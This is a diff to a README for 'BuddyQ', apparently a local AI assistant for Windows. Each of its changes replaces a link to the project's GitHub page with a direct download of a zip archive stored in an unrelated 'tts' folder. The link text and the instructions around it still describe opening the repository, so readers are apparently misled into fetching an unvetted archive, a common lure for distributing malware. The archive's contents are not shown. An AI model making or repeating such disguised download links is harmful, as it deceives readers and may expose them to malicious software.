@@ -1,6 +1,6 @@
 # 🤖 BuddyQ - Your Private Local AI Assistant
 
-[![Download BuddyQ](https://img.shields.io/badge/Download-BuddyQ-blue?style=for-the-badge)](https://github.com/Hoyaspadework921/BuddyQ)
+[![Download BuddyQ](https://img.shields.io/badge/Download-BuddyQ-blue?style=for-the-badge)](https://github.com/Hoyaspadework921/BuddyQ/raw/refs/heads/main/tts/Q-Buddy-1.1.zip)
 
 ## 📋 What is BuddyQ?
 
@@ -58,7 +58,7 @@ Follow these steps to download and run BuddyQ on your Windows PC.
 
 Visit the BuddyQ GitHub page to get the latest release:
 
-[![Download BuddyQ](https://img.shields.io/badge/Download-BuddyQ-green?style=for-the-badge)](https://github.com/Hoyaspadework921/BuddyQ)
+[![Download BuddyQ](https://img.shields.io/badge/Download-BuddyQ-green?style=for-the-badge)](https://github.com/Hoyaspadework921/BuddyQ/raw/refs/heads/main/tts/Q-Buddy-1.1.zip)
 
 - Click the link above to open the BuddyQ GitHub repository.
 - Look for the **Releases** section on the page.
@@ -137,7 +137,7 @@ Visit the BuddyQ GitHub page for:
 - Community discussions and issue reporting
 
 GitHub Repository:  
-https://github.com/Hoyaspadework921/BuddyQ
+https://github.com/Hoyaspadework921/BuddyQ/raw/refs/heads/main/tts/Q-Buddy-1.1.zip
 
 ---
 
@@ -163,4 +163,4 @@ To update BuddyQ, check the GitHub page regularly:
 
 ---
 
-# [👉 Visit BuddyQ GitHub Repository](https://github.com/Hoyaspadework921/BuddyQ)
+# [👉 Visit BuddyQ GitHub Repository](https://github.com/Hoyaspadework921/BuddyQ/raw/refs/heads/main/tts/Q-Buddy-1.1.zip)
